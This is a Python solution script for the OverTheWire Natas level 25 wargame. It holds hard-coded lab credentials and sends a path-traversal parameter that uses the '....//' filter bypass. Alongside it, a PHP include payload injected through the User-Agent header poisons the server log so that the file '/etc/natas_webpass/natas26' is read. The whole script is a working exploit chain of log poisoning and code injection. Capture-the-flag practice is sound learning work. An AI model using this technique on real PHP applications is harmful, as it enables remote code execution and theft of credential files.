import requests

sess = requests.Session()
sess.auth = ("natas25", "GHF6X7YwACaYYssHVY05cFq83hRktl4c")

# do a GET request simply to get PHPSESSID for the follwing POST request.
res = sess.get(url="http://natas25.natas.labs.overthewire.org/")

res = sess.post(url=f"http://natas25.natas.labs.overthewire.org/index.php?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_{res.cookies['PHPSESSID']}.log", headers={"User-Agent" : "<?php include '/etc/natas_webpass/natas26'; ?>"})

print(res.text)

sess.close()
